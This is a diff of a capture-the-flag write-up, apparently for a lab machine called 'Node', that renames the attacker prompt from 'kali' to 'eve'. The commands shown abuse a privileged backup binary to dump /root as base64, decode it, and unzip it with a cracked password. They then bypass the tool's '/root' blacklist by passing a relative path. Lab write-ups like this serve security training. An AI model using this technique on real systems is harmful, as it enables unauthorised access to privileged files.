@@ -95,35 +95,35 @@ The last line above reveals the usage of the backup command, which references a 
 node$ /usr/local/bin/backup -q <backup_key> /root
 
 # Copy and paste the output into your attack machine
-kali$ vim node-slash-root.b64
+eve$ vim node-slash-root.b64
 
 # Base64 decode it into a zip file
-kali$ base64 --decode node-slash-root.b64 > node-slash-root.zip
+eve$ base64 --decode node-slash-root.b64 > node-slash-root.zip
 
 # Unzip using 7z and provide password gleaned from fcrackzip above
-kali$ 7z x node-slash-root.zip
+eve$ 7z x node-slash-root.zip
 
 # We can see there is a root.txt, so let's look at it
-kali$ cat root.txt
+eve$ cat root.txt
 ```
 Instead of a root flag we see ASCII art of a troll face. :( So it seems that /root is blacklisted. What if we cd to the `/` directory and try backing up `root` as a relative path?
 ```
-# Move to the / directory
-cd /
+# Move to the / directory on the node box
+node$ cd /
 
 # Run the backup tool against root
 node$ /usr/local/bin/backup -q <backup_key> root
 
-# Copy and paste the output into your attack machine
-kali$ vim node-relative-root.b64
+# Copy and paste the output over to eve
+eve$ vim node-relative-root.b64
 
 # Base64 decode it into a zip file
-kali$ base64 --decode node-relative-root.b64 > node-relative-root.zip
+eve$ base64 --decode node-relative-root.b64 > node-relative-root.zip
 
 # Unzip using 7z and provide password gleaned from fcrackzip above
-kali$ 7z x node-relative-root.zip
+eve$ 7z x node-relative-root.zip
 
 # We can see there is a root.txt, so let's look at it
-kali$ cat root.txt
+eve$ cat root.txt
 ```
 And now we can see the root flag! :)
